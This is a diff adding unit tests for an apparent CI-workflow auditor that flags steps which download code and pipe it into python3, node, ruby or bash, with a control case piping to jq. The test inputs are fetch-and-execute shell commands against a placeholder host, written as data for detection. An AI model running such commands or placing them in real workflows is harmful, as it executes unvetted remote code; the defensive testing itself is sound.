@@ -74,6 +74,22 @@ class RatchetTests(unittest.TestCase):
         )
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
 
+    def test_direct_remote_python_code_execution_rejected(self):
+        self.write("jobs:\n  x:\n    steps:\n      - run: curl -fsSL https://example.invalid/install.py | python3 -\n")
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_download_node_code_execution_rejected(self):
+        self.write("jobs:\n  x:\n    steps:\n      - run: wget -qO- https://example.invalid/install.js | node\n")
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_remote_ruby_code_execution_via_tee_rejected(self):
+        self.write("jobs:\n  x:\n    steps:\n      - run: curl -fsSL https://example.invalid/install.rb | tee inspect.rb | ruby\n")
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_download_to_jq_without_execution_not_blocked(self):
+        self.write("jobs:\n  x:\n    steps:\n      - run: curl -fsSL https://example.invalid/config.json | jq .\n")
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
+
     def test_download_tee_pipe_bash_denied(self):
         self.write("jobs:\n  x:\n    steps:\n      - run: |\n          curl -fsSL https://example.invalid/install.sh | tee payload.sh | bash\n")
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
